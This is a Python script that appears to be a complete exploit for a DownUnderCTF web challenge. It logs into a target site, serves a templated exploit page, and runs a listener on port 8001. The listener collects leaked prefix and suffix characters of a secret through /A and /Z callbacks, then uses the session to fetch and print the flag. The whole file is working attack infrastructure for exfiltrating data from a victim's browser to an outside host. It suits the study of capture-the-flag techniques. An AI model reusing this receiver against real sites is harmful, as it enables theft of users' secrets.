import re
import sys
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer

if len(sys.argv) < 2:
    print(f'Usage: {sys.argv[0]} <REMOTE_URL>')
    sys.exit(1)

REMOTE = sys.argv[1]
start = ''
end   = ''
sess = requests.Session()
resp = sess.post(f'{REMOTE}/login', data={'username': 'todo'})
user_id = resp.text.split('<a href="/playground/')[1].split('"')[0]

class Server(BaseHTTPRequestHandler):
    def _respond(self, status=200, headers={}):
        self.send_response(status)
        for k, v in headers.items():
            self.send_header(k, v)
        self.end_headers()
    
    def static_exploit(self):
        global REMOTE, user_id
        self._respond(200, {'Content-Type': 'text/html'})
        return open('exploit.html', 'r').read() \
                .replace('{{REMOTE}}', REMOTE) \
                .replace('{{USERID}}', user_id)
    
    def get_404(self):
        self._respond(404, {'Content-Type': 'text/plain'})
        return '404 Not Found'

    def get_known(self):
        global start, end
        self._respond(200, {'Content-Type': 'application/json'})
        return '{"start":"' + start + '","end":"' + end + '"}'
    
    def get_getflag(self):
        global sess
        resp = sess.get(f'{REMOTE}/me')
        print(re.search(
            r'DUCTF\{[^\}]+\}',
            resp.text
        )[0])

        self._respond(200, {'Content-Type': 'text/plain'})
        return '1'
    
    def get_reset(self):
        global start, end
        start = ''
        end = ''

        self._respond(200, {'Content-Type': 'text/plain'})
        return '1'
    
    def match_A(self):
        global start
        guess = self.path[2:]
        if len(guess) > len(start):
            start = guess
        self._respond(200, {'Content-Type': 'text/plain'})
        return '1'

    def match_Z(self):
        global end 
        guess = self.path[2:]
        if len(guess) > len(end):
            end = guess
        self._respond(200, {'Content-Type': 'text/plain'})
        return '1'

    def do_GET(self):
        resp_body = None
        if self.path == '/known':
            resp_body = self.get_known()
        elif self.path == '/getflag':
            resp_body = self.get_getflag()
        elif self.path == '/reset':
            resp_body = self.get_reset()
        elif self.path == '/exploit':
            resp_body = self.static_exploit()
        elif self.path.startswith('/A'):
            resp_body = self.match_A()
        elif self.path.startswith('/Z'):
            resp_body = self.match_Z()
        else:
            resp_body = self.get_404()
        
        self.wfile.write(resp_body.encode())

if __name__ == '__main__':
    httpd = HTTPServer(('0.0.0.0', 8001), Server)
    httpd.serve_forever()